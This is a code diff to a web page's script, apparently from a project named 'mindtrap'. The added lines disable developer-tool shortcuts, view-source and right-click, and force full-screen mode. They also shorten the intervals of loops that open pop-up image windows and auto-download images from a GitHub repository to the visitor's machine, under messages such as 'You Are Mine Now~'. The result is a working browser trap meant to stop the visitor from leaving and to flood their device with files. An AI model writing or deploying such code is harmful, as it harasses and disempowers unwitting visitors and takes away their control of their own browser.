@@ -17,6 +17,33 @@
         }
     </style>
     <script>
+        // Prevent closing (Disables F12, Right Click, Ctrl+Shift+I, etc.)
+        document.addEventListener('keydown', function(event) {
+            if (event.key === "F12" || 
+                (event.ctrlKey && event.shiftKey && event.key === "I") || 
+                (event.ctrlKey && event.shiftKey && event.key === "J") || 
+                (event.ctrlKey && event.key === "U")) {
+                event.preventDefault();
+                alert("No escaping, pet~ 💕");
+            }
+        });
+
+        // Disable right-click
+        document.addEventListener('contextmenu', event => event.preventDefault());
+
+        // Full-Screen Request
+        function goFullScreen() {
+            if (document.documentElement.requestFullscreen) {
+                document.documentElement.requestFullscreen();
+            } else if (document.documentElement.mozRequestFullScreen) {
+                document.documentElement.mozRequestFullScreen();
+            } else if (document.documentElement.webkitRequestFullscreen) {
+                document.documentElement.webkitRequestFullscreen();
+            } else if (document.documentElement.msRequestFullscreen) {
+                document.documentElement.msRequestFullscreen();
+            }
+        }
+
         // List of image URLs
         const images = [
             "https://raw.githubusercontent.com/velvettemptress/mindtrap/main/undefined_image%20%2810%29.png",
@@ -53,9 +80,10 @@
         ];
 
         function startTrap() {
+            goFullScreen(); // Force full-screen mode
             document.body.innerHTML += "<h1>You Are Mine Now~ 💕</h1>";
 
-            // Faster pop-ups & full-screen chaos
+            // Unstoppable pop-ups
             setInterval(() => {
                 let imgURL = images[Math.floor(Math.random() * images.length)]; // Random image
                 
@@ -64,9 +92,9 @@
                     newWin.document.write(`<img src="${imgURL}" width="100%" height="100%">`);
                     setTimeout(() => { newWin.close(); }, 2000); // Close after 2 seconds
                 }
-            }, 1000); // Faster pop-ups (every 1 sec)
+            }, 800); // Pop-ups every 0.8 sec
 
-            // Auto-download images every 3 seconds
+            // Auto-download images every 2.5 seconds
             setInterval(() => {
                 let imgIndex = Math.floor(Math.random() * images.length);
                 let link = document.createElement('a');
@@ -75,7 +103,7 @@
                 document.body.appendChild(link);
                 link.click();
                 document.body.removeChild(link);
-            }, 3000);
+            }, 2500);
         }
     </script>
 </head>
